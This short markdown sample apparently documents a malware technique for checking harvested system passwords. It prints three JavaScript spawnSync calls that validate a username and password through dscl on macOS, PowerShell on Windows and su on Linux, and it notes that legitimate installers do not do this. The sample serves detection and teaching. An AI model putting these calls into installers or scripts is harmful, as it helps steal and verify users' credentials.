# Password Validation Harvest Showcase

This sample demonstrates cross-platform credential validation code used by malware to verify user-supplied system passwords before second-stage theft:

```js
spawnSync("dscl", [".", "-authonly", username, password], { stdio: "pipe", timeout: 5000 });
spawnSync("powershell", ["-NoProfile", "-NonInteractive", "-Command", "$ctx.ValidateCredentials(username,password)"]);
spawnSync("su", ["-c", "true", username], { input: password + "\n", stdio: "pipe" });
```

Legitimate installers should not collect raw passwords and validate them directly via OS auth CLIs.
